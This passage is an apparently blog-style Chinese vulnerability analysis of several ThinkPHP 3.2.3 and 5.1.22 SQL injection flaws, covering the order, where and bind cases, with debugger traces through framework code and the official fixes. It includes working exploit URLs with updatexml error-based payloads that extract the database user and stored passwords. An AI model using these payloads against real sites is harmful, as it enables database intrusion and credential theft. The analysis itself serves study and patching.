            ....
            }
        }
        return $result;
    }
对传入的`$data`变量进行遍历，当`$val[0]=='inc'`时，就会将`$val[1]`与`$val[2]`拼接
（本意应该是生成一个
    INSERT INTO `user` (`username`) VALUES ( username+1 )
这类似的语句
但是这里没有对拼接的参数进行验证，导致恶意sql语句被拼接，从而引发sql注入
除了`insert`方法还有`update`也能触发该漏洞
## 漏洞修复
官方给出的修复方式是连接前对`$val[1]`进行一次判断
只有当`$val[1]==$key`键值时才能进行拼接（那万一要执行
    INSERT INTO `user` (`age`) VALUES ( oldage+1 )
呢？
# ThinkPHP 5.1.22 order by 注入
同时受到影响的还有3.2.3及以下的版本，这里仅以5.1.22进行分析
## 漏洞利用
下载好对应版本的ThinkPHP之后，创建一个demo页面
    public function index()
    {
        $data=array();
        $data['username']=array('eq','admin');
        $order=input('get.order');
        $m=db('user')->where($data)->order($order)->find();
        dump($m);        
    }
数据库
设置好对应的数据库配置，以及开启`debug`模式
访问如下url即可产生注入
    http://localhost/tp5.1.22/public/?order[id`|updatexml(1,concat(0x3a,user()),1)%23]=1
## 漏洞分析
在数据库处理的地方下好断点，跟入数据库的操作，可以来到`order`函数中（`thinkphp\library\think\db\Query.php:1823`）
有很多代码区域都没有进入，所以只贴上相关的代码
动态调试中，就主要经过了这几个点
    public function order($field, $order = null)
    {
        ....
        if (!isset($this->options['order'])) {
            $this->options['order'] = [];
        }
        if (is_array($field)) {
            $this->options['order'] = array_merge($this->options['order'], $field);
        } else {
            ....
        }
        return $this;
    }
可以看到，当`$field`是一个数组的时候，直接用`array_merge`进行了数组拼接，没有进行任何过滤
所以导致键名直接拼接到了语句中，从而在预编译阶段报错
最后还是和其他SQL注入类似，由于PDO的原因，导致无法进行子查询
# ThinkPHP 3.2.3 where注入
终于找到一个支持子查询的SQL注入了，估摸着应该是3和5版本的区别（感觉tp5中的注入都是蛮鸡肋的，但思路值得学习
## 漏洞利用
下载`3.2.3`版本的ThinkPHP，在`IndexController.class.php`中创建一个demo
    public function index(){
        $data = M('user')->find(I('GET.id'));
        var_dump($data);
    }
创建好`user`表以及`id`、`username`、`password`字段，然后配置好`config.php`文件
    '配置值'
        'DB_TYPE'           =>  'mysql',
        'DB_HOST'           =>  'localhost',
        'DB_NAME'           =>  'tp5',
        'DB_USER'           =>  'root',
        'DB_PWD'            =>  '',
        'DB_PORT'           =>  '3306',
        'DB_FIELDS_CACHE'   =>  true,
        'SHOW_PAGE_TRACE'   =>  true,
    );
访问`http://localhost/tp3.2.3/index.php?id=1`就可以看到数据被取出
然后访问如下url即可产生注入
    http://localhost/tp3.2.3/index.php?id[where]=3 and 1=updatexml(1,concat(0x7,(select password from user limit 1),0x7e),1)%23
## 漏洞分析
通过payload可以看到还是利用数组的形式进行传参，从而造成了sql注入，感觉一般都是在数组这层，对数据的过滤不够严谨，导致的字符串拼接，从而sql注入
在`$data =
M('user')->find(I('GET.id'));`中下好断点，跟踪到`ThinkPHP/Library/Think/Model.class.php:720`的`select`函数中
只列出两条比较重要的语句
    public function find($options=array()) {
        ....
        // 分析表达式
        $options            =   $this->_parseOptions($options);
        ....
        $resultSet          =   $this->db->select($options);
        .....
    }
在一开始的`$this->_parseOptions($options);`中，本来是对传入的pk进行了类型转换，导致无法进行sql注入
    protected function _parseOptions($options=array()) {
        ....
        // 字段类型验证
        if(isset($options['where']) && is_array($options['where']) && !empty($fields) && !isset($options['join'])) {
            // 对数组查询条件进行字段类型检查
            foreach ($options['where'] as $key=>$val){
                $key            =   trim($key);
                if(in_array($key,$fields,true)){
                    if(is_scalar($val)) {
                        $this->_parseType($options['where'],$key);
                    }
                }elseif(!is_numeric($key) && '_' != substr($key,0,1) && false === strpos($key,'.') && false === strpos($key,'(') && false === strpos($key,'|') && false === strpos($key,'&')){
                    if(!empty($this->options['strict'])){
                        E(L('_ERROR_QUERY_EXPRESS_').':['.$key.'=>'.$val.']');
                    } 
                    unset($options['where'][$key]);
                }
            }
        }
        ...
    }
但是由于传入的是数组的原因，导致略过了类型转换部分，从而将恶意语句带入了下文中
然后最后被带入到`$this->db->select($options);`
    public function select($options=array()) {
        $this->model  =   $options['model'];
        $this->parseBind(!empty($options['bind'])?$options['bind']:array());
        $sql    = $this->buildSelectSql($options);
        $result   = $this->query($sql,!empty($options['fetch_sql']) ? true : false);
        return $result;
    }
跟入到`$sql = $this->buildSelectSql($options);`中
    public function buildSelectSql($options=array()) {
        if(isset($options['page'])) {
            // 根据页数计算limit
            list($page,$listRows)   =   $options['page'];
            $page    =  $page>0 ? $page : 1;
            $listRows=  $listRows>0 ? $listRows : (is_numeric($options['limit'])?$options['limit']:20);
            $offset  =  $listRows*($page-1);
            $options['limit'] =  $offset.','.$listRows;
        }
        $sql  =   $this->parseSql($this->selectSql,$options);
        return $sql;
    }
再到`$sql = $this->parseSql($this->selectSql,$options);`
    public function parseSql($sql,$options=array()){
        $sql   = str_replace(
            array('%TABLE%','%DISTINCT%','%FIELD%','%JOIN%','%WHERE%','%GROUP%','%HAVING%','%ORDER%','%LIMIT%','%UNION%','%LOCK%','%COMMENT%','%FORCE%'),
            array(
                $this->parseTable($options['table']),
                $this->parseDistinct(isset($options['distinct'])?$options['distinct']:false),
                $this->parseField(!empty($options['field'])?$options['field']:'*'),
                $this->parseJoin(!empty($options['join'])?$options['join']:''),
                $this->parseWhere(!empty($options['where'])?$options['where']:''),
                $this->parseGroup(!empty($options['group'])?$options['group']:''),
                $this->parseHaving(!empty($options['having'])?$options['having']:''),
                $this->parseOrder(!empty($options['order'])?$options['order']:''),
                $this->parseLimit(!empty($options['limit'])?$options['limit']:''),
                $this->parseUnion(!empty($options['union'])?$options['union']:''),
                $this->parseLock(isset($options['lock'])?$options['lock']:false),
                $this->parseComment(!empty($options['comment'])?$options['comment']:''),
                $this->parseForce(!empty($options['force'])?$options['force']:'')
            ),$sql);
        return $sql;
    }
可以看到是将`option`中的字段字节直接在sql语句中进行了拼接，而且从这也能看出，不仅仅有`where`还有以些`tables`、`field`之类的字段都可以控制，因为也会被直接拼接到语句中
然后语句被执行，引发了报错注入
该漏洞涉及到`select`、`find`、`delete`等方法
## 漏洞修复
新的版本中将`$options`和`$this->options`进行了区分，从而传入的参数无法污染到`$this->options`，也就无法控制sql语句了。
# ThinkPHP 3.2.3 bind 注入
## 漏洞利用
demo页面
    public function index(){
        $User = M("user");
        $user['id'] = I('id');
        $data['username'] = I('username');
        $data['password'] = I('password');
        $valu = $User->where($user)->save($data);
        var_dump($valu);
    }
还有数据库和`config.php`配置一下
访问`http://localhost/tp3.2.3/index.php?username=admin&password=123&id=1`看到
就表示成功`update`了一条语句，然后访问
    http://localhost/tp3.2.3/index.php
    ?username=admin
    &password=123
    &id[]=bind
    &id[]=1 and updatexml(1,concat(0x7,(select password from user limit 1),0x7e),1)
即可看到报错
## 漏洞分析
漏洞的重点就在于参数中的`id[]=bind`，我们只要跟踪由于这个引起的变化，就能看到漏洞触发的全过程。
来到`ThinkPHP/Library/Think/Model.class.php:396` save函数中（很多代码无用被缩了起来
获取了表名字段名一些准备工作之后会进入`$this->db->update($data,$options);`
最后会来到`parseWhere`的解析
到目前位置传入的`options`中的`where`条件依旧是传入的数组
漏洞重点在于`ThinkPHP/Library/Think/Db/Driver.class.php:547`中
当`'bind'==$exp`的时候，就会直接将key和value拼接到where表达式中（本意应该只是生成占位符
导致最后sql语句变为
    UPDATE `user` SET `username`=:0,`password`=:1 WHERE `id` = :1 and updatexml(1,concat(0x7,(select password from user limit 1),0x7e),1)
在最后`execute`时，就只会替换`:1`部分的数据
`ThinkPHP/Library/Think/Db/Driver.class.php:196`
    public function execute($str,$fetchSql=false) {
        $this->initConnect(true);
        if ( !$this->_linkID ) return false;
        $this->queryStr = $str;
        if(!empty($this->bind)){
            $that   =   $this;
            $this->queryStr =   strtr($this->queryStr,array_map(function($val) use($that){ return '\''.$that->escapeString($val).'\''; },$this->bind));
        }
        ...
导致后面的`and updatexml(1,concat(0x7,(select password from user limit
1),0x7e),1)`语句逃逸，从而产生SQL注入
## 漏洞修复
修复方案只是在`I`函数的过滤器上加入了对于`bind`的过滤
emmm，有点不知道怎么评论
# Reference Links